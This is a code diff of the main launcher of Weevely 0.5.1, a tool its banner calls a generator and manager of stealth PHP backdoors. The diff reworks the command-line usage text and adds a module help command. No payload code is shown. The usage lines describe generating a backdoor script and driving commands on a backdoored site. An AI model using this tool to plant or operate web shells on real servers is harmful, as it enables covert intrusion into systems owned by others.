@@ -18,10 +18,10 @@
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 
 
-from core.terminal import Terminal, module_trigger
+from core.terminal import Terminal, module_trigger, help_string
 from core.backdoor import Backdoor
 from core.modules_handler import ModHandler
-from core.modules_info import ModInfos
+from core.helper import Helper
 from core.test import Test
 
 import sys
@@ -31,15 +31,17 @@ Weevely 0.5.1 - Generate and manage stealth PHP backdoors
                 Emilio Pinna 2011-2012            
 '''
    
-help_string = '''Start telnet-like session
+general_usage = '''Start telnet-like session
   weevely <url> <password> 
   
 Run single command or module
-  weevely <url> <password> <command> 
-  weevely <url> <password> :<module name> <argument1> <arg2> ..
+  weevely <url> <password> <command> [argument1] [argument2] ..
 
 Generate PHP backdoor script
   weevely generate <password> <output path> 
+  
+Show modules help
+  weevely <url> <password> :help [module name]
 '''  
     
 if __name__ == "__main__":
@@ -73,26 +75,31 @@ if __name__ == "__main__":
         
     elif len(sys.argv) > 3 and sys.argv[1].startswith('http'):
 
-        
-        
         url = sys.argv[1]
         password = sys.argv[2]        
         
-        try:
-            terminal = Terminal (ModHandler(url, password), True)
+        
+        if sys.argv[3] == help_string:
+            modname = ''
+            if len(sys.argv)>4:
+                modname = sys.argv[4]
+            print Helper().helps(modname)
             
-            if sys.argv[3][0] == module_trigger:
-                terminal.run_module_cmd(sys.argv[3:])
-            else:
-                terminal.run_line_cmd(' '.join(sys.argv[3:]))
-            
-            
-        except KeyboardInterrupt:
-            print '\n[!] Exiting. Bye ^^'
+        else:
+        
+            try:
+                terminal = Terminal (ModHandler(url, password), True)
+                
+                if sys.argv[3][0] == module_trigger:
+                    terminal.run_module_cmd(sys.argv[3:])
+                else:
+                    terminal.run_line_cmd(' '.join(sys.argv[3:]))
+                
+                
+            except KeyboardInterrupt:
+                print '\n[!] Exiting. Bye ^^'
     else:
         
-        print help_string
-        ModInfos().print_module_summary()
-            
-        print ''
+        print '%s\nAvailable modules\n\n%s\n' % (general_usage, Helper().summaries())
+        
     
